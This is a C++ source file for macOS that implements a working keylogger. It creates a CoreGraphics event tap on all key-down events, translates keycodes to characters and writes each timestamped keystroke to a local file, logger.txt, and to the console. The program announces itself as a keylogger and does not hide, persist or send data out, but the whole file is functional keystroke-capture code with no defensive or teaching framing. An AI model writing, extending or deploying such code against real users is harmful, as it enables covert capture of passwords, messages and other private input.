#include <ApplicationServices/ApplicationServices.h>
#include <iostream>
#include <fstream>

std::ofstream loggerFile;
#define FILE_NAME "logger.txt"
// prototypes
const char *keyCode2Char(int keyCode);
CGEventRef kCGKeyboardEventCallback(CGEventTapProxy proxy, CGEventType type, CGEventRef event, void* userInfo);

int main()
{
    // define event mask for key down events
    CGEventMask eventMask = CGEventMaskBit(kCGEventKeyDown);
    // create event tap
    CFMachPortRef eventTap = CGEventTapCreate
    (
        kCGSessionEventTap,
        kCGHeadInsertEventTap,
        kCGEventTapOptionDefault,
        eventMask,
        kCGKeyboardEventCallback,
        NULL
    );

    if (!eventTap)
    {
        std::cerr << "Error: Could not create event tap. Check Accessibility Permissions." << std::endl;
        return 1;
    }

    // create run loop source and enable event tap
    CFRunLoopSourceRef runLoopSource = CFMachPortCreateRunLoopSource(kCFAllocatorDefault, eventTap, 0);
    if (!runLoopSource) 
    {
        std::cerr << "Error: Could not create run loop source." << std::endl;
        CFRelease(eventTap);
        return 1;
    }
    CFRunLoopAddSource(CFRunLoopGetCurrent(), runLoopSource, kCFRunLoopCommonModes);
    CGEventTapEnable(eventTap, true);

    std::cout << "Keylogger started. Press Ctrl+C to exit." << std::endl;

    loggerFile.open(FILE_NAME);
    if (!loggerFile.is_open())
    {
        std::cerr << "Unable to open log file." << std::endl;
        return 1;
    }
    
    CFRunLoopRun();

    return 0;
}

CGEventRef kCGKeyboardEventCallback(CGEventTapProxy proxy, CGEventType type, CGEventRef event, void* userInfo)
{
    if (type == kCGEventKeyDown)
    {
        CGKeyCode typedKeyCode = static_cast<CGKeyCode>(CGEventGetIntegerValueField(event, kCGKeyboardEventKeycode));
        // get current system timestamp
        std::time_t t = std::time(nullptr);
        std::tm tm = *std::localtime(&t);
        char timestamp[20];
        std::strftime(timestamp, sizeof(timestamp), "%d-%m-%Y %H:%M:%S", &tm);
        // display timestamp, key-code and key-value
        std::cout << timestamp << " [KeyCode]: " << typedKeyCode << " [KeyValue]: " << keyCode2Char(typedKeyCode) << std::endl;

        // append timestamp and keystroke to the log file
        loggerFile << timestamp << " Keystroke: " << keyCode2Char(typedKeyCode) << std::endl;
    }
    return event;
}

const char* keyCode2Char(int keyCode)
{
    switch(keyCode)
    {
        case 0: return "a";
        case 1: return "s";
        case 2: return "d";
        case 3: return "f";
        case 4: return "h";
        case 5: return "g";
        case 6: return "z";
        case 7: return "x";
        case 8: return "c";
        case 9: return "v";
        case 11: return "b";
        case 12: return "q";
        case 13: return "w";
        case 14: return "e";
        case 15: return "r";
        case 16: return "y";
        case 17: return "t";
        case 18: return "1";
        case 19: return "2";
        case 20: return "3";
        case 21: return "4";
        case 22: return "6";
        case 23: return "5";
        case 24: return "=";
        case 25: return "9";
        case 26: return "7";
        case 27: return "-";
        case 28: return "8";
        case 29: return "0";
        case 30: return "]";
        case 31: return "o";
        case 32: return "u";
        case 33: return "[";
        case 34: return "i";
        case 35: return "p";
        case 36: return "RETURN";
        case 37: return "l";
        case 38: return "j";
        case 39: return "'";
        case 40: return "k";
        case 41: return ";";
        case 42: return "\\";
        case 43: return ",";
        case 44: return "/";
        case 45: return "n";
        case 46: return "m";
        case 47: return ".";
        case 48: return "TAB";
        case 49: return "SPACE";
        case 50: return "`";
        case 51: return "DELETE";
        case 52: return "ENTER";
        case 53: return "ESCAPE";
        case 65: return ".";
        case 67: return "*";
        case 69: return "+";
        case 71: return "CLEAR";
        case 75: return "/";
        case 76: return "ENTER";
        case 78: return "-";
        case 81: return "=";
        case 82: return "0";
        case 83: return "1";
        case 84: return "2";
        case 85: return "3";
        case 86: return "4";
        case 87: return "5";
        case 88: return "6";
        case 89: return "7";
        case 91: return "8";
        case 92: return "9";
        case 96: return "F5";
        case 97: return "F6";
        case 98: return "F7";
        case 99: return "F3";
        case 100: return "F8";
        case 101: return "F9";
        case 103: return "F11";
        case 105: return "F13";
        case 107: return "F14";
        case 109: return "F10";
        case 111: return "F12";
        case 113: return "F15";
        case 114: return "HELP";
        case 115: return "HOME";
        case 116: return "PGUP";
        case 117: return "DELETE";
        case 118: return "F4";
        case 119: return "END";
        case 120: return "F2";
        case 121: return "PGDN";
        case 122: return "F1";
        case 123: return "LEFT";
        case 124: return "RIGHT";
        case 125: return "DOWN";
        case 126: return "UP";
    }
    return "unknown key";
}
